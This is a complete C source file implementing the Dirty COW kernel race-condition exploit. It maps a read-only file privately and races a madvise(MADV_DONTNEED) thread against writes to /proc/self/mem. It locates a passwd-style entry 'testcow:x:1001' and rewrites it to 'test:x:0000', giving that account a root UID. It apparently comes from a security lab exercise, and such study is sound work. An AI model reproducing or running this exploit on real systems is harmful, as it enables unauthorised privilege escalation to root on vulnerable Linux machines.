#include <stdio.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <pthread.h>
#include <unistd.h>
#include <sys/stat.h>
#include <string.h>
#include <stdint.h>

#define OFFSET 10

void *map;
int offset;

void *madviseThread(void *arg)
{
  while(1){
      madvise(map, 4097, MADV_DONTNEED);
  }
}

void *procselfmemThread(void *arg)
{
  char *content= (char*) arg;
  char current_content[10];

  int f=open("/proc/self/mem", O_RDWR);
  while(1) {
    //Set the file pointer to the OFFSET from the beginning
    lseek(f, (uintptr_t) map + offset, SEEK_SET);
    write(f, content, strlen(content));
  }
}


int main(int argc, char *argv[])
{
  pthread_t pth1,pth2;
  struct stat st;

  // Open the file in read only mode.
  int f=open("/zzz", O_RDONLY);

  // Open with PROT_READ.
  fstat(f, &st);
  map=mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, f, 0);

  // Find the offset to the target area
  char *start = strstr(map, "testcow:x:1001"); 
  offset = start - (char *)map;
  printf("distance: %d\n", offset);

  // We have to do the attack using two threads.
  pthread_create(&pth1, NULL, madviseThread, NULL);
  pthread_create(&pth2, NULL, procselfmemThread, "test:x:0000");

  // Wait for the threads to finish.
  pthread_join(pth1, NULL);
  pthread_join(pth2, NULL);

  return 0;
}

